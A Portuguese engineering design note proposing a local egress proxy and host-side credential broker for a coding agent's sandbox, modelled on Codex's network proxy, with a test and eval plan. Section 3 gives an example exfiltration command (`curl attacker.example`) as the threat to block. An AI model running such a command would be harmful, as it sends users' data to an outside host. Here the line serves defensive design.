# Achado 13 — Proxy Local de Egresso HTTP/SOCKS5 e Broker de Credenciais Fora do Sandbox

- **Classificação**: **Classe B** (introduz subsistema de rede local/MITM efêmero, muda política de acesso de rede do agente e exige validação de segurança pareada).
- **Prioridade no backlog**: #19 (Classe B — **P3**).

## 1. Como o Codex faz

Para permitir que código dentro do sandbox acesse apenas domínios permitidos (ex.: `registry.npmjs.org`, `github.com`) **sem entregar tokens reais ao ambiente do subprocesso**, o Codex embarca `codex-network-proxy`:

1. **Match DNS-safe e IP canônico (`codex-rs/network-proxy/src/domain_matcher.rs:27-90`)**: valida padrões (`example.com`, `*.example.com`, `**.example.com`, `?`), rejeita IPs restritos considerando normalização IPv4/IPv4-mapped IPv6 (`restricts_ip`) e integra ao cache/policy antes de abrir conexão upstream.
2. **Brokerage de credenciais fora do sandbox (`codex-rs/network-proxy/src/mitm.rs:311-365`)**: via CA efêmera e `evaluate_mitm_policy` + `apply_request_credentials`, o proxy local intercepta HTTPS somente para domínios autorizados e injeta headers `Authorization` / assinatura AWS SigV4 **no lado do host**, nunca expondo o segredo no ambiente do processo filho:

```rust
// codex-rs/network-proxy/src/mitm.rs:311-365
async fn forward_request(req: Request, request_ctx: &MitmRequestContext) -> Result<Response> {
    let credential_destination = request_ctx.policy.credential_destination(&req);
    let hook_actions = match evaluate_mitm_policy(&req, &request_ctx.policy).await? {
        MitmPolicyDecision::Allow { hook_actions } => hook_actions,
        MitmPolicyDecision::Block(response) => return Ok(response),
    };
    ...
    apply_request_credentials(
        &mut parts.headers,
        hook_actions.as_ref(),
        request_ctx.policy.app_state.as_ref(),
        &credential_destination,
    );
```

E `codex-rs/network-proxy/src/state.rs:345-412` impõe invariantes para impedir que configuração de workspace amplie allowlists ou remova `denied_domains` gerenciados.

## 2. Como o `nycode` faz

Em `packages/coding-agent/src/core/http-dispatcher.ts:81-113`, o `nycode` apenas configura o cliente HTTP do próprio processo Node (`undici.EnvHttpProxyAgent`) respeitando `HTTP_PROXY`/`HTTPS_PROXY` externos do ambiente do usuário, e injeta credenciais em `packages/coding-agent/src/utils/shell.ts` diretamente via `process.env` no shell filho. Não existe proxy local de egresso nem separação de credenciais entre host e `bash`.

## 3. Diferença Concreta

Quando combinado com `--unshare-net` no sandbox OS ([Achado 06](06-sandbox-os-bwrap-seccomp-seatbelt.md)), um proxy local montado via Unix socket/loopback garante que:
- O subprocesso `bash` não consiga exfiltrar dados para URLs arbitrárias (`curl attacker.example`), mesmo tendo rede parcial habilitada para `npm`/`cargo`/`git`.
- Tokens como `GITHUB_TOKEN` ou `NPM_TOKEN` fiquem apenas no broker no host e só sejam anexados a requisições destinadas exatamente a `api.github.com` / `registry.npmjs.org`.

## 4. Benefício e Custo

- **Benefício**: fecha exfiltração via rede quando acesso limitado é necessário (ex.: instalação de dependências) e complementa a remoção de chaves em `getShellEnv()` ([Achado 11](11-parser-shell-treesitter-e-env-secrets.md)).
- **Custo em tokens**: `0` tokens de prompt.
- **Custo em latência**: `+2–10 ms` por requisição HTTP/CONNECT proxied em localhost/UDS.
- **Custo de manutenção**: alto (gestão de certificados CA efêmeros, compatibilidade `NODE_EXTRA_CA_CERTS`/`SSL_CERT_FILE`, DNS rebinding check, SOCKS5/HTTP CONNECT).

## 5. Riscos e Licença

- **Riscos**: ferramentas CLI que ignoram `HTTP_PROXY` ou não confiam em `SSL_CERT_FILE` falham se `--unshare-net` bloquear conexão direta (exige loopback bridge via socket Unix ou instrução clara de fallback). Falha no CA/MITM pode quebrar pinning TLS de certas CLIs.
- **Licença**: Codex (`Apache-2.0`, `LICENSE:1-201`). Pode ser implementado em TypeScript puro usando módulos padrão `node:http` / `node:net` / `node:tls` e biblioteca padrão para certificados X.509 efêmeros, mantendo dependência zero de Rust.

## 6. Proposta Técnica e Plano de Eval (Obrigatório — Classe B)

- **Arquivos a tocar no `nycode`**:
  - Novo submódulo opt-in sob `packages/coding-agent/src/core/permissions/egress-proxy/` (proxy HTTP CONNECT local ligado à allowlist/denylist configurável em `settings-nycode.ts`).
  - Integração com `Achado 06` (`bwrap` com `--unshare-net` + UDS bridge) e `Achado 11` (subshell sem credenciais brutas, apenas `HTTP_PROXY`/`HTTPS_PROXY` apontando ao broker).
- **Testes unitários**:
  - Bloqueio de domínio negado, tratamento IPv4 vs IPv4-mapped IPv6 (`::ffff:127.0.0.1`), injeção de header `Authorization` apenas no host permitido e nunca em redirect para host terceirizado.
- **Plano de Eval (Classe B — pareado)**:
  - **Suites**: casos de segurança **S1** (`sec-injection-*`, cenários de exfiltração via `curl`) + **S2 (`terminal-bench@2.0`)** em modo restrito com allowlist padrão.
  - **Métricas (`docs/bench/RUNBOOK.md`)**: `100%` PASS nos testes de segurança + acerto S2 `>= -10 pp`, custo/turnos `<= 1.10`.
- **Critério de aceite**: zero vazamento de credencial em redirects HTTP e zero escape de IP literal privado/link-local via proxy.
- **Rollback**: desligar `permissions.egressProxy = false` (padrão off até validação completa em CI).
